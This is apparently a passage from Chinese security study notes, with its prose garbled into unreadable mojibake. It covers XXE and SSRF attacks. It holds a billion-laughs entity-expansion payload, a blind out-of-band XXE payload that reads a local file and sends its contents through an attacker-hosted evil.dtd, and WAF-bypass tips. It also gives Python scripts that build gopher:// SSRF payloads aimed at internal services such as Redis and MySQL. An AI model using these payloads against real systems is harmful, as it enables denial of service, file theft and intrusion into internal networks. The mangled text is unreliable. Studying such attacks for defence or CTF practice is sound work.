class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol8 &quot;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol9 &quot;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;&quot;&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="params">&lt;lolz&gt;</span><span class="variable">&amp;lol9</span><span class="punctuation">;</span><span class="params">&lt;/lolz&gt;</span></span><br></pre></td></tr></table></figure>

<p>å½“<code>XML  parser</code>è½½è¿™ä¸ªæ–‡ä»¶ï¼Œå®ƒè®¤ä¸ºï¼Œå®ƒåŒ…æ‹¬ä¸€ä¸ªæ ¹æœ¬çš„å…ƒç´ ï¼Œâ€<code>lolz</code>â€œï¼ŒåŒ…å«çš„æ–‡æœ¬â€<code>&amp;lol9</code>;â€.  ç„¶è€Œï¼Œâ€<code>&amp;lol9</code>;â€æ˜¯ä¸€ä¸ªå·²å®šä¹‰çš„å®ä½“ï¼Œæ‰©å±•ä¸ºä¸€ä¸ªåŒ…å«åä¸ªâ€&lol8;â€ä¸²ã€‚  æ¯ä¸ªâ€<code>&amp;lol8</code>;â€ä¸²æ˜¯ä¸€ä¸ªå·²å®šä¹‰çš„å®ä½“ï¼Œæ‰©å±•åˆ°åâ€<code>&amp;lol7</code>;â€ä¸²ï¼Œç­‰ç­‰ã€‚  </p>
<p>åœ¨æ‰€æœ‰çš„å®ä½“æ‰©å¼ ï¼Œå·²ç»è¿›è¡Œå¤„ç†ï¼Œ<strong>è¿™ä¸€å°å‹(&lt;1KB)çš„æ¡†XMLå®é™…ä¸Šä¼šé‡‡å–äº†å‡ ä¹3åƒå…†å­—èŠ‚çš„å­˜å‚¨å™¨ã€‚</strong> </p>
<h3 id="ç›²æ³¨XXE"><a href="#ç›²æ³¨XXE" class="headerlink" title="ç›²æ³¨XXE"></a>ç›²æ³¨XXE</h3><p>åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥å°† <code>XXE</code> <code>payload</code>å‘é€åˆ° <code>Web</code> åº”ç”¨ç¨‹åºï¼Œä½†<strong>æ°¸è¿œä¸ä¼šè¿”å›å“åº”</strong>ï¼Œè¿™è¢«ç§°ä¸ºå¸¦å¤–æ¼æ´ï¼ˆ<code>Out-of-band</code>ï¼‰</p>
<p>åˆ©ç”¨æ­¤ç±»æ¼æ´çš„è¿‡ç¨‹éœ€è¦åˆ©ç”¨å‚æ•°å®ä½“ï¼Œä½¿æ”»å‡»è€…è®© <code>XML</code> è§£æå™¨å‘æ”»å‡»è€…</p>
<p><strong>æ§åˆ¶çš„æœåŠ¡å™¨å‘å‡ºé¢å¤–çš„è¯·æ±‚ï¼Œä»¥ä¾¿è¯»å–æ–‡ä»¶çš„å†…å®¹</strong></p>
<p>ä½œä¸ºä¸€ä¸ªæ”»å‡»è€…ä½ æœ‰<code>WebWolf</code>åœ¨ä½ çš„æ§åˆ¶( <strong>è¿™å¯ä»¥æ˜¯ä»»ä½•æœåŠ¡å™¨ä½ çš„æ§åˆ¶ä¹‹ä¸‹.</strong> ), ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªæœåŠ¡å™¨å¹³ä½¿ç”¨  <code>http://127.0.0.1:9090/home</code></p>
<p>æˆ‘ä»¬å¦‚ä½•ä½¿ç”¨è¿™äº›ç»ˆç«¯æ£€éªŒæˆ‘ä»¬æ˜¯å¦å¯ä»¥æ‰§è¡Œ<code>XXE</code>? </p>
<p>æˆ‘ä»¬å¯ä»¥å†æ¬¡ä½¿ç”¨WebWolfä¸¾åŠä¸€ä¸ªæ–‡ä»¶å«  <code>attack.dtd</code> åˆ›å»ºè¿™ä¸€æ–‡ä»¶ä¸ä»¥ä¸‹å†…å®¹ï¼š </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">ping</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;&lt;a href=&quot;http://127.0.0.1:9090/landing&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;a href=&quot;http://127.0.0.1:9090/landing&quot; class=&quot;bare&quot;&gt;http://127.0.0.1:9090/landing&lt;/a&gt;&lt;/a&gt;&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç°åœ¨æäº¤å½¢å¼çš„æ”¹å˜ä½¿ç”¨<code>xml</code>ï¼š </p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;webWolfLink:[webWolfLink]&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%remote;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">text</span>&gt;</span>test<span class="symbol">&amp;ping;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>ç°åœ¨<code>WebWolf</code>æµè§ˆâ€™è¿›å…¥çš„<code>è¯·æ±‚</code>ï¼Œä½ ä¼šçœ‹åˆ°ï¼š </p>
<figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;method&quot;</span> : <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">  <span class="string">&quot;path&quot;</span> : <span class="string">&quot;/landing&quot;</span>,</span><br><span class="line">  <span class="string">&quot;headers&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;request&quot;</span> : &#123;</span><br><span class="line">      <span class="string">&quot;user-agent&quot;</span> : <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;parameters&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;test&quot;</span> : [ <span class="string">&quot;HelloWorld&quot;</span> ],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;timeTaken&quot;</span> : <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› æ­¤ï¼Œé€šè¿‡<code>XXE</code>èƒ½å¤Ÿè¿æ¥æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨ï¼Œè¿™æ„å‘³ç€<code>XXE</code>æ³¨å…¥æ˜¯å¯èƒ½çš„ã€‚ å› æ­¤ï¼Œé€šè¿‡<code>XXE</code>æ³¨å…¥æˆ‘ä»¬åŸºæœ¬ä¸Šèƒ½å¤Ÿè¾¾åˆ°ï¼Œ<code>curl</code>å‘½ä»¤çš„ç›¸åŒçš„æ•ˆæœ </p>
<h4 id="å¼•ç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„DTD"><a href="#å¼•ç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„DTD" class="headerlink" title="å¼•ç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„DTD"></a>å¼•ç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„DTD</h4><p>å¦ä¸€ç§æ–¹å¼<code>% å˜é‡</code>(æœ‰ç©ºæ ¼)ï¼Œè¯¥æ–¹å¼åªèƒ½åœ¨DTDä¸­è¿›è¡Œå˜é‡å¼•ç”¨<code>%å˜é‡</code>ï¼Œè€Œä¸èƒ½åœ¨XMLä¸­å¼•ç”¨ã€‚</p>
<p>æ”¹ä¸ºå¼•ç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„DTD(<code>evil.dtd</code>)</p>
<p>å¦‚æœåœ¨å“åº”åŒ…ä¸­<strong>æ— å›æ˜¾åˆæƒ³è¦è¯»å–æ•æ„Ÿæ–‡ä»¶</strong>æ—¶ï¼Œå¯ä»¥é€šè¿‡<code>OOB</code>å¸¦å¤–æ³¨å…¥çš„æ–¹æ³•<strong>é€šè¿‡å¤–å¸¦æ•°æ®é€šé“æ¥æå–æ•°æ®</strong>ï¼Œæ„é€ <code>payload</code>å¦‚ä¸‹ ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">GVI</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">body</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///tmp/test.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">//æ”»å‡»è€…è¿œç¨‹éƒ¨ç½²evil.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">write</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XXE-ä»‹ç»ä¸ç»•è¿‡"><a href="#XXE-ä»‹ç»ä¸ç»•è¿‡" class="headerlink" title="XXE ä»‹ç»ä¸ç»•è¿‡"></a>XXE ä»‹ç»ä¸ç»•è¿‡</h3><p>ä¸€ä¸ª <code>xml</code> æ–‡æ¡£ä¸ä»…å¯ä»¥ç”¨ <code>UTF-8</code> ç¼–ç ï¼Œä¹Ÿå¯ä»¥ç”¨ <code>UTF-16(ä¸¤ä¸ªå˜ä½“â€Š-â€ŠBE å’Œ LE)ã€UTF-32(å››ä¸ªå˜ä½“â€Š-â€ŠBEã€LEã€2143ã€3412)</code> å’Œ <code>EBCDIC</code> ç¼–ç ã€‚ </p>
<p>åœ¨è¿™ç§ç¼–ç çš„å¸®åŠ©ä¸‹ï¼Œä½¿ç”¨<code>æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥å¾ˆå®¹æ˜“åœ°ç»•è¿‡ WAF</code>ï¼Œå› ä¸ºåœ¨è¿™ç§ç±»å‹çš„ WAF ä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼<code>é€šå¸¸ä»…é…ç½®ä¸ºå•å­—ç¬¦é›†</code>ã€‚ <code>å¤–æ¥ç¼–ç ä¹Ÿå¯ç”¨äºç»•è¿‡æˆç†Ÿçš„ WAF</code>ï¼Œå› ä¸ºå®ƒä»¬å¹¶ä¸æ€»æ˜¯èƒ½å¤Ÿå¤„ç†ä¸Šé¢åˆ—å‡ºçš„æ‰€æœ‰ç¼–ç ã€‚</p>
<p>ä¾‹å¦‚ï¼Œ<code>libxml2</code> è§£æå™¨åªæ”¯æŒä¸€ç§ç±»å‹çš„ <code>utf-32â€Š-â€Šutf-32BE</code>ï¼Œç‰¹åˆ«æ˜¯ä¸æ”¯æŒ <code>BOM</code>ã€‚</p>
<h2 id="äº”ã€ssrf"><a href="#äº”ã€ssrf" class="headerlink" title="äº”ã€ssrf"></a>äº”ã€ssrf</h2><h3 id="ä¸å½“å‡½æ•°åˆ©ç”¨"><a href="#ä¸å½“å‡½æ•°åˆ©ç”¨" class="headerlink" title="ä¸å½“å‡½æ•°åˆ©ç”¨"></a>ä¸å½“å‡½æ•°åˆ©ç”¨</h3><blockquote>
<p>PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:<br>&#96;&#96;file_get_contents()<code> </code>fsockopen()<code> </code>curl_exec()&#96;   </p>
</blockquote>
<h4 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content"></a>file_get_content</h4><blockquote>
<p><code>file_get_content()</code>å‡½æ•°æ˜¯ç”¨äºå°†æ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ï¼Œé€»è¾‘å’Œå‰é¢ä¸€æ ·ã€‚å®ƒæ”¯æŒè¯»å–è¿œç¨‹æ–‡ä»¶æˆ–è€…æœ¬åœ°æ–‡ä»¶ï¼Œä¹Ÿæ”¯æŒå¤šç§åè®®ã€‚æ›´å¤šçš„ï¼Œå®ƒè¿˜æ”¯æŒphpä¼ªåè®®ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¼ªåè®®æ–¹æ³•è¯»å–æœ¬åœ°æºç </p>
</blockquote>
<h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h4><blockquote>
<p>é€šè¿‡<code>curl_exec()</code>å‡½æ•°æ‰§è¡Œurlä¼ è¿‡æ¥å‚æ•°ç»™çš„åœ°å€ï¼Œç„¶åå°†å‚æ•°è¿”å›å‰ç«¯ã€‚å¦‚æœurlå‚æ•°è¢«æ›¿æ¢æˆ<a href="http://xxxxæˆ–è€…curlæ”¯æŒçš„å…¶ä»–åè®®ç­‰éƒ½ä¼šè¢«curlæ‰§è¡Œ(curlæ”¯æŒ`telnet/">http://xxxxæˆ–è€…curlæ”¯æŒçš„å…¶ä»–åè®®ç­‰éƒ½ä¼šè¢«curlæ‰§è¡Œï¼ˆcurlæ”¯æŒ`telnet</a> ftp ftps dict file ldap&#96;ç­‰ï¼‰</p>
</blockquote>
<h3 id="gopheråè®®æ€»ç»“"><a href="#gopheråè®®æ€»ç»“" class="headerlink" title="gopheråè®®æ€»ç»“"></a>gopheråè®®æ€»ç»“</h3><blockquote>
<p><a href="https://blog.csdn.net/unexpectedthing/article/details/121667791">åŸæ–‡</a></p>
<p><a href="https://blog.csdn.net/qq_60115503/article/details/124407499">å¦ä¸€ç¯‡æ¨èçš„æ–‡ç« </a></p>
</blockquote>
<blockquote>
<p>gopheråè®®</p>
<p>æ˜¯ä¸€ç§ä¿¡æ¯æŸ¥0æ‰¾ç³»ç»Ÿï¼Œä»–å°†Internetä¸Šçš„æ–‡ä»¶ç»„ç»‡æˆæŸç§ç´¢å¼•ï¼Œæ–¹ä¾¿ç”¨æˆ·ä»Internetçš„ä¸€å¤„å¸¦åˆ°å¦ä¸€å¤„ã€‚åœ¨WWWå‡ºç°ä¹‹å‰ï¼ŒGopheræ˜¯Internetä¸Šæœ€ä¸»è¦çš„ä¿¡æ¯æ£€ç´¢å·¥å…·ï¼ŒGopherç«™ç‚¹ä¹Ÿæ˜¯æœ€ä¸»è¦çš„ç«™ç‚¹ï¼Œä½¿ç”¨tcp70ç«¯å£ã€‚åˆ©ç”¨æ­¤åè®®å¯ä»¥æ”»å‡»å†…ç½‘çš„ Redisã€Mysqlã€FastCGIã€Ftpç­‰ç­‰ï¼Œä¹Ÿå¯ä»¥å‘é€ GETã€POST è¯·æ±‚ã€‚è¿™æ‹“å®½äº† SSRF çš„æ”»å‡»é¢</p>
</blockquote>
<h4 id="1-åˆ©ç”¨ï¼š"><a href="#1-åˆ©ç”¨ï¼š" class="headerlink" title="1)åˆ©ç”¨ï¼š"></a>1)åˆ©ç”¨ï¼š</h4><blockquote>
<p>æ”»å‡»å†…ç½‘çš„ <code>Redisã€Mysqlã€FastCGIã€Ftp</code>ç­‰ç­‰ï¼Œä¹Ÿå¯ä»¥å‘é€ <code>GETã€POST</code> è¯·æ±‚</p>
</blockquote>
<p>gopheråè®®çš„æ ¼å¼ï¼š</p>
<blockquote>
<p><code>gopher://IP:port/_TCP/IPæ•°æ®æµ</code>  </p>
<p>æ¯”å¦‚ï¼Œ</p>
<p><code>gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1</code></p>
</blockquote>
<blockquote>
<p>æœ‰æ—¶å€™è¯»å–æ–‡ä»¶éœ€è¦ä»ç½‘ç«™<code>æœ¬èº«çš„127.0.0.1å‘å‡ºè¯·æ±‚</code></p>
<p>å¯ä»¥åˆ©ç”¨<code>file://</code>ä¼ªåè®®ç”¨äºè¯»å–æœ¬åœ°æ–‡ä»¶</p>
<p>æ¯”å¦‚<br><code>?url=file:///var/www/html/flag.php</code></p>
</blockquote>
<h4 id="2-GTEè¯·æ±‚"><a href="#2-GTEè¯·æ±‚" class="headerlink" title="2)GTEè¯·æ±‚"></a>2)GTEè¯·æ±‚</h4><blockquote>
<p>æ„é€ HTTPæ•°æ®åŒ…</p>
<p>URLç¼–ç ã€æ›¿æ¢å›è½¦æ¢è¡Œä¸º%0d%0aï¼ŒHTTPåŒ…æœ€ååŠ %0d%0aä»£è¡¨æ¶ˆæ¯ç»“æŸ</p>
<p>å‘é€gopheråè®®, åè®®åçš„IPä¸€å®šè¦æ¥ç«¯å£</p>
</blockquote>
<h4 id="3-POSTè¯·æ±‚"><a href="#3-POSTè¯·æ±‚" class="headerlink" title="3)POSTè¯·æ±‚"></a>3)POSTè¯·æ±‚</h4><blockquote>
<p>POSTä¸GETä¼ å‚çš„åŒºåˆ«ï¼šå®ƒæœ‰4ä¸ªå‚æ•°ä¸ºå¿…è¦å‚æ•°</p>
<p>éœ€è¦ä¼ é€’<br>Content-Type,<br>Content-Length,<br>host,<br>postçš„å‚æ•°</p>
<p>æ¯”å¦‚ï¼š</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST</span> /flag.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">127.0.0.1:80</span></span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">36</span></span><br><span class="line"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">key</span>=<span class="number">51457</span>bb0a50c1eb2c92dcc3ec3c2cc13        //postå‚æ•°</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>Host</code>ã€<code>Content-Type</code>å’Œ<code>Content-Length</code>è¯·æ±‚å¤´æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œä½†åœ¨ GETè¯·æ±‚ä¸­å¯ä»¥æ²¡æœ‰<br><code>åˆ‡è®°ï¼šContent-Length è¿™ä¸ªè¦å’Œåº•ä¸‹POSTå‚æ•°[æ¯”å¦‚ä¾‹å­ä¸­key=,4ä¸ª+51457bb0a50c1eb2c92dcc3ec3c2cc13,32ä¸ªï¼Œå…±è®¡36ä¸ª]é•¿åº¦ä¸€è‡´</code></p>
</blockquote>
<p>pythonè„šæœ¬ç”Ÿæˆpayloadï¼ˆPOSTå’ŒGTEè¯·æ±‚éƒ½é€‚ç”¨ï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key=a68a3b03e80ce7fef96007dfa01dc077</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload) <span class="comment">#å¯¹payloadä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç¼–ç </span></span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>) <span class="comment">#CRLFLæ¼æ´</span></span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)<span class="comment"># å¯¹æ–°å¢çš„éƒ¨åˆ†ç»§ç»­ç¼–ç </span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h5 id="æ„é€ ä¸€ä¸ªæäº¤æ–‡ä»¶çš„POSTè¯·æ±‚"><a href="#æ„é€ ä¸€ä¸ªæäº¤æ–‡ä»¶çš„POSTè¯·æ±‚" class="headerlink" title="æ„é€ ä¸€ä¸ªæäº¤æ–‡ä»¶çš„POSTè¯·æ±‚"></a>æ„é€ ä¸€ä¸ªæäº¤æ–‡ä»¶çš„POSTè¯·æ±‚</h5><p>é¦–å…ˆæŠ“å–ä¸€ä¸ªæ­£å¸¸æäº¤æ–‡ä»¶çš„æ•°æ®åŒ…ï¼Œç„¶åä½¿ç”¨ä¸Šè¿°è„šæœ¬å°†å…¶è½¬æ¢ä¸ºgopheråè®®çš„æ ¼å¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = \</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 293</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Origin: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080/?url=http://127.0.0.1/flag.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hello world!</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">submit</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="gopheræ‰“FastCGI"><a href="#gopheræ‰“FastCGI" class="headerlink" title="gopheræ‰“FastCGI"></a>gopheræ‰“FastCGI</h4><blockquote>
<p><a href="https://blog.csdn.net/unexpectedthing/article/details/121643002">çœ‹æˆ‘è¿™ä¸€ç¯‡</a></p>
</blockquote>
<h4 id="gopheræ‰“redis"><a href="#gopheræ‰“redis" class="headerlink" title="gopheræ‰“redis"></a>gopheræ‰“redis</h4><blockquote>
<p><a href="https://blog.csdn.net/unexpectedthing/article/details/121667613">çœ‹æˆ‘è¿™ä¸€ç¯‡</a></p>
</blockquote>
<h4 id="gopheræ‰“mysql"><a href="#gopheræ‰“mysql" class="headerlink" title="gopheræ‰“mysql"></a>gopheræ‰“mysql</h4><p><code>gopher</code>æ‰“<code>mysql</code>ï¼Œå°±æ˜¯åˆ©ç”¨<code>gopher</code>åè®®ä¼ <code>shell</code>åˆ°<code>mysql</code>ä¸­ã€‚</p>
<p>é¦–å…ˆMysqlå­˜åœ¨ä¸‰ç§è¿æ¥æ–¹å¼</p>
<blockquote>
<p>Unixå¥—æ¥å­—ï¼›<br>å†…å­˜å…±äº«&#x2F;å‘½åç®¡é“ï¼›<br>TCP&#x2F;IPå¥—æ¥å­—ï¼›</p>
</blockquote>
<p><code>MySQL</code>å®¢æˆ·ç«¯è¿æ¥å¹¶ç™»å½•æœåŠ¡å™¨æ—¶å­˜åœ¨ä¸¤ç§æƒ…å†µï¼šéœ€è¦å¯†ç è®¤è¯ä»¥åŠæ— éœ€å¯†ç è®¤è¯ã€‚</p>
<blockquote>
<p>å½“éœ€è¦å¯†ç è®¤è¯æ—¶ä½¿ç”¨æŒ‘æˆ˜åº”ç­”æ¨¡å¼ï¼ŒæœåŠ¡å™¨å…ˆå‘é€saltç„¶åå®¢æˆ·ç«¯ä½¿ç”¨saltåŠ å¯†å¯†ç ç„¶åéªŒè¯<br>å½“æ— éœ€å¯†ç è®¤è¯æ—¶ç›´æ¥å‘é€TCP&#x2F;IPæ•°æ®åŒ…å³å¯</p>
</blockquote>
<p>è¿™å„¿å¯¹<code>localhost</code>å’Œ127.0.0.1åšä¸€ä¸ªåŒºåˆ«</p>
<blockquote>
<p><code>localhost</code>ä¹Ÿå«local ï¼Œæ­£ç¡®çš„è§£é‡Šæ˜¯ï¼š<code>æœ¬åœ°æœåŠ¡å™¨ã€‚</code><br><code>127.0.0.1</code>çš„æ­£ç¡®è§£é‡Šæ˜¯ï¼š<code>æœ¬æœºåœ°å€ï¼ˆæœ¬æœºæœåŠ¡å™¨ï¼‰</code>ï¼Œå®ƒçš„è§£æé€šè¿‡æœ¬æœºçš„hostæ–‡ä»¶ï¼Œ<code>windowsè‡ªåŠ¨å°†localhostè§£æä¸º127.0.0.</code>1ã€‚</p>
<p><code>localhostï¼ˆlocalï¼‰</code>æ˜¯<code>ä¸ç»ç½‘å¡ä¼ è¾“çš„ï¼Œè¿™ç‚¹å¾ˆé‡è¦ï¼Œå®ƒä¸å—ç½‘ç»œé˜²ç«å¢™å’Œç½‘å¡ç›¸å…³çš„çš„é™åˆ¶</code>ã€‚</p>
<p><code>127.0.0.1</code>æ˜¯é€šè¿‡<code>ç½‘å¡ä¼ è¾“ï¼Œä¾èµ–ç½‘å¡ï¼Œå¹¶å—åˆ°ç½‘ç»œé˜²ç«å¢™å’Œç½‘å¡ç›¸å…³çš„é™åˆ¶</code></p>
<p>ç®€å•è¯´<br>å½“æˆ‘ä»¬é€šè¿‡<code>mysql -hlocalhost -uname</code>å»è¿æ¥çš„æ—¶å€™ï¼Œ**<code>æ²¡æœ‰ç»è¿‡ç½‘å¡</code>**ï¼Œä½¿ç”¨çš„æ˜¯<code>unix</code>å¥—æ¥å­—è¿æ¥ï¼Œè¿™ç§æ—¶å€™æˆ‘ä»¬<code>tcpdump</code>æ˜¯æŠ“ä¸åˆ°åŒ…çš„<br>å½“æˆ‘ä»¬éœ€è¦æŠ“å–<code>mysql</code>é€šä¿¡æ•°æ®åŒ…æ—¶<code>å¿…é¡»ä½¿ç”¨TCP/IP</code>å¥—æ¥å­—è¿æ¥ã€‚<br><code>mysql -h 127.0.0.1 -uname</code></p>
</blockquote>
<p>æˆ‘ä»¬å¹³å¸¸æ‰“<code>mysql</code>æœ€å¸¸ç”¨çš„å°±æ˜¯æ‰“<strong>æ— å¯†ç </strong>çš„<code>mysql</code></p>
